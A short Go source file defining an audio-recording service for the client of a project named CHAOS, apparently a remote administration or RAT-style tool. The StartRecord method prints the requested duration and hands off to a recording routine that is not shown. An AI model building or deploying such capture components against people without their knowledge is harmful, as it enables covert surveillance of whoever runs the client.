package audio

import (
	"fmt"
	"os"

	"github.com/justadoll/CHAOS/client/app/services"
	"github.com/justadoll/CHAOS/client/app/services/audio"
)

type AudioService struct{}

func NewAudioService() services.Audio {
	return &AudioService{}
}

func (d AudioService) StartRecord(seconds string) error {
	fmt.Println("Recording seconds: ", seconds)
	err := audio.Run(os.Args)
	return err
}
